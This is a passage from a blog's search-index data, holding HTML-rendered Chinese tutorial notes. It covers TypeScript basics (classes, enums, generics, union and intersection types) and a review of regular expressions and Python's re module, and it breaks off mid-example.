class=\"built_in\">number</span></span>): <span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> add2 = (x: <span class=\"built_in\">number</span>, <span class=\"attr\">y</span>: <span class=\"built_in\">number</span>, z?:<span class=\"built_in\">number</span>): <span class=\"function\"><span class=\"params\">number</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> z === <span class=\"string\">&#x27;number&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x+y+z;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> ISum&#123;</span><br><span class=\"line\">    (x: <span class=\"built_in\">number</span>, <span class=\"attr\">y</span>: <span class=\"built_in\">number</span>, z?:<span class=\"built_in\">number</span>): <span class=\"built_in\">number</span>   <span class=\"comment\">//接口定义函数类型</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> add3: ISum = add</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"7-类型推论、联合类型、类型断言\"><a href=\"#7-类型推论、联合类型、类型断言\" class=\"headerlink\" title=\"7 类型推论、联合类型、类型断言\"></a>7 类型推论、联合类型、类型断言</h1><p>根据赋值的类型推断出变量的类型：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> str = <span class=\"string\">&#x27;sstr&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>联合类型</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> numberOrString: <span class=\"built_in\">number</span> | <span class=\"built_in\">string</span>;</span><br><span class=\"line\">numberOrString.length</span><br><span class=\"line\">numberOrString.toString  <span class=\"comment\">// 只能访问联合类型中共有的属性或者方法</span></span><br><span class=\"line\">numberOrString = <span class=\"number\">123</span>;</span><br><span class=\"line\">numberOrString = <span class=\"string\">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>类型断言：在函数中断言该变量类型是什么类型，然后调用对应的方法</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getLength</span>(<span class=\"params\">input: <span class=\"built_in\">string</span> | <span class=\"built_in\">number</span></span>): <span class=\"title\">number</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> str = input <span class=\"keyword\">as</span> <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (str.length)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> str.length</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> num = input <span class=\"keyword\">as</span> <span class=\"built_in\">number</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> num.toString().length</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>另一种写法：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getLength2</span>(<span class=\"params\">input: <span class=\"built_in\">string</span> | <span class=\"built_in\">number</span></span>): <span class=\"title\">number</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> input === <span class=\"string\">&#x27;string&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> input.length</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> input.toString().length</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"8-类\"><a href=\"#8-类\" class=\"headerlink\" title=\"8 类\"></a>8 类</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal</span></span>&#123;</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">name</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">run</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"built_in\">this</span>.name&#125;</span> is running`</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> snack = <span class=\"keyword\">new</span> Animal(<span class=\"string\">&#x27;test&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Dog</span> <span class=\"keyword\">extends</span> <span class=\"title\">Animal</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">bark</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"built_in\">this</span>.name&#125;</span> is barking`</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> xiaobao = <span class=\"keyword\">new</span> Dog(<span class=\"string\">&#x27;xiaobao&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>类实现接口</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> IRadio &#123;</span><br><span class=\"line\">    switchRadio(trigger: <span class=\"built_in\">boolean</span>): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> IBattary&#123;</span><br><span class=\"line\">    checkBattaryStatus(): <span class=\"built_in\">void</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> IRadioWithBattery <span class=\"keyword\">extends</span> IRadio&#123;</span><br><span class=\"line\">    checkBattaryStatus(): <span class=\"built_in\">void</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Car</span> <span class=\"title\">implements</span> <span class=\"title\">IRadio</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">switchRadio</span>(<span class=\"params\">trigger: <span class=\"built_in\">boolean</span></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CellPhone</span> <span class=\"title\">implements</span> <span class=\"title\">IRadioWithBattery</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">switchRadio</span>(<span class=\"params\">trigger: <span class=\"built_in\">boolean</span></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">checkBattaryStatus</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"9-枚举\"><a href=\"#9-枚举\" class=\"headerlink\" title=\"9 枚举\"></a>9 枚举</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">enum</span> Direction&#123;</span><br><span class=\"line\">    Up = <span class=\"number\">10</span>,</span><br><span class=\"line\">    Down,</span><br><span class=\"line\">    Left,</span><br><span class=\"line\">    Rigth,</span><br><span class=\"line\">&#125;  <span class=\"comment\">//首项进行赋值后，后续项进行递增</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(Direction.Left)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(Direction[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"built_in\">enum</span> Direction&#123;</span><br><span class=\"line\">    Up = <span class=\"string\">&quot;Up&quot;</span>,</span><br><span class=\"line\">    Down = <span class=\"string\">&quot;Down&quot;</span>,</span><br><span class=\"line\">    Left = <span class=\"string\">&quot;Left&quot;</span>,</span><br><span class=\"line\">    Rigth = <span class=\"string\">&quot;Right&quot;</span>,</span><br><span class=\"line\">&#125; <span class=\"comment\">//常量枚举</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"10-泛型\"><a href=\"#10-泛型\" class=\"headerlink\" title=\"10 泛型\"></a>10 泛型</h1><p>根据我们传入的一个类型，返回一个类型</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">echo</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">echo2</span>(<span class=\"params\">arg</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> str: <span class=\"built_in\">string</span> = <span class=\"string\">&quot;123&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> result = echo(str);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> result2 = echo2(str);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">swap</span>&lt;<span class=\"title\">T</span>, <span class=\"title\">U</span>&gt;(<span class=\"params\">tuple: [T, U]</span>): [<span class=\"title\">U</span>, <span class=\"title\">T</span>] </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [tuple[<span class=\"number\">1</span>], tuple[<span class=\"number\">0</span>]];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> res = swap([<span class=\"string\">&#x27;string&#x27;</span>, <span class=\"number\">123</span>])</span><br></pre></td></tr></table></figure>\n\n<p><strong>约束泛型</strong></p>\n<p>提前在代码中使用对应类型的方法及属性。</p>\n<p>通过接口定义来约束泛型</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> IWithLength&#123;</span><br><span class=\"line\">    length: <span class=\"built_in\">number</span>    <span class=\"comment\">//鸭子模型，有该属性就行，名称无所谓</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">echoWithArr2</span>&lt;<span class=\"title\">T</span> <span class=\"title\">extends</span> <span class=\"title\">IWithLength</span>&gt;(<span class=\"params\">arg: T[]</span>): <span class=\"title\">T</span>[]</span>&#123;   </span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(arg.length)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>泛型类</strong></p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Queue</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> data = [];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">push</span>(<span class=\"params\">item:T</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.data.push(item)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    pop():T&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.data.shift()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> queue = <span class=\"keyword\">new</span> Queue&lt;<span class=\"built_in\">number</span>&gt;();</span><br><span class=\"line\">queue.push(<span class=\"number\">1</span>);</span><br><span class=\"line\">queue.push(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(queue.pop().toFixed())</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(queue.pop().toFixed())</span><br></pre></td></tr></table></figure>\n\n<p><strong>泛型接口</strong></p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> KeyPair&lt;T, U&gt;&#123;</span><br><span class=\"line\">    key: T,</span><br><span class=\"line\">    value: U</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> kp1: KeyPair&lt;<span class=\"built_in\">number</span>, <span class=\"built_in\">string</span>&gt; = &#123;<span class=\"attr\">key</span>: <span class=\"number\">1</span>, <span class=\"attr\">value</span>: <span class=\"string\">&#x27;str&#x27;</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> kp2: KeyPair&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">number</span>&gt; = &#123;<span class=\"attr\">key</span>: <span class=\"string\">&#x27;1&#x27;</span>, <span class=\"attr\">value</span>: <span class=\"number\">123</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> arr2: <span class=\"built_in\">Array</span>&lt;<span class=\"built_in\">number</span>&gt; = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"11-交叉类型\"><a href=\"#11-交叉类型\" class=\"headerlink\" title=\"11 交叉类型\"></a>11 交叉类型</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> IName&#123;</span><br><span class=\"line\">    name:<span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> IPerson = IName &amp; &#123; <span class=\"attr\">age</span>: <span class=\"built_in\">number</span>&#125; <span class=\"comment\">// 使用&amp;将两个类型连接起来</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> person: IPerson = &#123;<span class=\"attr\">name</span>: <span class=\"string\">&#x27;test&#x27;</span>, <span class=\"attr\">age</span>: <span class=\"number\">123</span>&#125;   </span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Program"],"tags":["typescript"]},{"title":"正则表达式复习","url":"http://blog.le31ei.top/2020/11/24/正则表达式复习/","content":"<h1 id=\"0x01-基本语法\"><a href=\"#0x01-基本语法\" class=\"headerlink\" title=\"0x01 基本语法\"></a>0x01 基本语法</h1><p><strong>修饰符（g i m）</strong></p>\n<ul>\n<li>g：global表示全局匹配</li>\n<li>i：ignore case表示忽略大小写匹配</li>\n<li>m：multiple line多行匹配</li>\n</ul>\n<p><strong>元字符</strong></p>\n<ul>\n<li><code>.</code>：匹配除换行符以外的任意字符</li>\n<li><code>\\w</code>：匹配字母、数字、下划线、汉字</li>\n<li><code>\\s</code>：匹配任意空白字符</li>\n<li><code>\\d</code>：匹配数字</li>\n<li><code>\\b</code>：匹配单词的开始或者结束</li>\n<li><code>^</code>：匹配字符的开始</li>\n<li><code>$</code>：匹配字符的结束</li>\n</ul>\n<p><strong>重复</strong></p>\n<ul>\n<li><code>*</code>：重复0次或者多次</li>\n<li><code>+</code>：重复1次或者多次</li>\n<li><code>?</code>：重复0次或者1次</li>\n<li><code>&#123;n&#125;</code>：重复n次</li>\n<li><code>&#123;n,&#125;</code>：重复n次到多次</li>\n<li><code>&#123;n,m&#125;</code>：重复n到m次</li>\n</ul>\n<p><strong>字符类</strong></p>\n<p><code>[]</code>：匹配中括号中的任意一个字符</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[abc]：匹配abc任意一个字符</span><br></pre></td></tr></table></figure>\n\n<p><strong>反义</strong></p>\n<p><code>[^]</code>：不包含中括号中的任意一个字符</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[^abc]：不包含abc任意一个字符</span><br></pre></td></tr></table></figure>\n\n<p><code>\\W</code>：除\\w意外的任意字符</p>\n<p><code>\\S</code>：匹配任意不是空白符的字符</p>\n<p><code>\\D</code>：匹配任意非数字的字符</p>\n<p><code>\\B</code>：匹配不是单词开头或结束的位置</p>\n<p>范围类**</p>\n<p><code>[a-z]、[A-Z]、[0-9]</code>：匹配范围内的任意一个</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[a-zA-Z0-9]：匹配范围中的任意一个字符</span><br></pre></td></tr></table></figure>\n\n<p><strong>贪婪与非贪婪</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">s = re.search(<span class=\"string\">&quot;\\d&#123;3,6&#125;&quot;</span>,<span class=\"string\">&#x27;123456789&#x27;</span>)</span><br><span class=\"line\">print(s.group())</span><br><span class=\"line\"><span class=\"comment\"># output: 123456</span></span><br><span class=\"line\"><span class=\"comment\"># 贪婪模式匹配最多的情况</span></span><br><span class=\"line\"></span><br><span class=\"line\">s = re.search(<span class=\"string\">&quot;\\d&#123;3,6&#125;?&quot;</span>,<span class=\"string\">&#x27;123456789&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># output: 123，后面加个问号，非贪婪模式，匹配最小3个的情况</span></span><br><span class=\"line\"></span><br><span class=\"line\">a.*?b： 匹配最短的，以a开始，以b结尾的字符串</span><br></pre></td></tr></table></figure>\n\n<p><strong>分组</strong></p>\n<p><code>abc&#123;2&#125;</code>：不分组，只重复最后一个字符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.search(<span class=\"string\">&quot;abc&#123;2&#125;&quot;</span>,<span class=\"string\">&#x27;abc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">AttributeError: <span class=\"string\">&#x27;NoneType&#x27;</span> <span class=\"built_in\">object</span> has no attribute <span class=\"string\">&#x27;group&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.search(<span class=\"string\">&quot;abc&#123;2&#125;&quot;</span>,<span class=\"string\">&#x27;abcc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">abcc</span><br></pre></td></tr></table></figure>\n\n<p><code>(abc)&#123;2&#125;</code>：重复abc两次</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.search(<span class=\"string\">&quot;(abc)&#123;2&#125;&quot;</span>,<span class=\"string\">&#x27;abcabc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">abcabc</span><br></pre></td></tr></table></figure>\n\n<p>用小括号指定一个表达式后，每个分组自动拥有一个组号，从1开始编号。</p>\n<p><code>\\b(\\w+)\\b\\s+\\1\\b</code>：可以匹配两个空格间隔的单词，如，<code>go go</code></p>\n<p><code>\\b(?&lt;Word&gt;\\w+)\\b\\s+\\k&lt;Word&gt;\\b</code>：可以使用组名来替代组的编号</p>\n<p><strong>零宽断言</strong></p>\n<p>用于查找某些内容，但又不占用这个位置，称为零宽断言。</p>\n<p><code>(?=exp)</code>：比如<code>\\b\\w+(?=ing)\\b</code>可以匹配以ing结尾的前面部分，如<code>dancing</code>会匹配danc</p>\n<p><code>(?&lt;=exp)</code>：比如<code>(?&lt;=\\bre)\\w+\\b</code>可以匹配re开头的单词的后半部分，如<code>reading</code>会匹配ading</p>\n<p><strong>负向零宽断言</strong></p>\n<p>表示某个字符或者某个字符串不在里面的方法，类似于<code>[^abc]</code>，但这种方式只能判断单个字符，如果表示字符串不包含<code>abc</code>整体，则要用到负向零宽断言</p>\n<p><code>(?!exp)</code>：<code>\\b((?!abc)\\w)+</code>表示不包含abc连续字符的单词</p>\n<h1 id=\"0x02-python-re模块\"><a href=\"#0x02-python-re模块\" class=\"headerlink\" title=\"0x02 python re模块\"></a>0x02 python re模块</h1><p><code>re.compile(pattern, flags=0)</code>：编译正则表达式为一个对象，flag为标记为，可以使用<code>|</code>进行结合，可能的值有如下几种：</p>\n<p><code>re.A</code>、<code>re.ASCII</code>：让<code>\\w</code> <code>\\W</code> <code>\\b</code> <code>\\B</code> <code>\\D</code> <code>\\d</code> <code>s</code> <code>\\S</code>只匹配ASCII，忽略unicode</p>\n<p><code>re.I</code>、<code>re.IGNORECASE</code>：忽略匹配大小写</p>\n<p><code>re.M</code>、<code>re.MULTILINE</code>：匹配多行字符</p>\n<p><strong>常用函数</strong></p>\n<p><code>re.search(pattern, string, flag=0)</code>：扫描整个字符串，匹配到第一个就返回，并返回一个匹配对象，没有匹配返回None</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.search(<span class=\"string\">&quot;(abc)&#123;2&#125;&quot;</span>,<span class=\"string\">&#x27;abcabc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">abcabc</span><br></pre></td></tr></table></figure>\n\n<p><code>re.match(pattern, string, flag=0)</code>：从字符串开头进行匹配，并返回一个匹配对象，没有匹配返回None</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.match(<span class=\"string\">&quot;abc\\d+&quot;</span>, <span class=\"string\">&quot;abc1&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">abc1</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.match(<span class=\"string\">&quot;abc\\d+&quot;</span>, <span class=\"string\">&quot;12312abc1&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">AttributeError: <span class=\"string\">&#x27;NoneType&#x27;</span> <span class=\"built_in\">object</span> has no attribute <span 